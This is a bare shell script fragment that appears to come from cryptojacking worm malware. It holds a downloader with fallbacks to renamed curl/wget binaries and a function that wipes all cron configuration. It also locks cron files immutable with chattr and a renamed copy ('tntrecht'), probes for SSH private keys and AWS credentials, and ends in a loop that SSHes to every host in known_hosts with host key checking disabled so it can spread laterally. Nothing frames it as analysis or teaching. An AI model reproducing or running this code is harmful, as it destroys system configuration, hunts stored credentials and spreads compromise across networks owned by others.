downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code = `cd1 -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 10 --retry 100 $1 > $2
        else
            cd1 --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}


function clean_cron(){
    chattr -R -ia /var/spool/cron
    tntrecht -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    tntrecht -ia /etc/crontab
    chattr -R -ia /etc/cron.d
    tntrecht -R -ia /etc/cron.d
    chattr -R -ia /var/spool/cron/crontabs
    tntrecht -R -ia /var/spool/cron/crontabs
    crontab -r
    rm -rf /var/spool/cron/*
    rm -rf /etc/cron.d/*
    rm -rf /var/spool/cron/crontabs
    rm -rf /etc/crontab
}

function lock_cron()
{
    chattr -R +ia /var/spool/cron
    tntrecht -R +ia /var/spool/cron
    touch /etc/crontab
    chattr +ia /etc/crontab
    tntrecht +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    tntrecht -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
    tntrecht -R +ia /etc/cron.d
}

function CheckAboutSomeKeys(){
    if [ -f "/root/.ssh/id_rsa" ]
    then
			echo 'found: /root/.ssh/id_rsa'
    fi

    if [ -f "/home/*/.ssh/id_rsa" ]
    then
			echo 'found: /home/*/.ssh/id_rsa'
    fi

    if [ -f "/root/.aws/credentials" ]
    then
			echo 'found: /root/.aws/credentials'
    fi

    if [ -f "/home/*/.aws/credentials" ]
    then
			echo 'found: /home/*/.aws/credentials'
    fi
}

## 内网互信主机执行命令
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
    for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do
	  ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'hostname' & 
	done
fi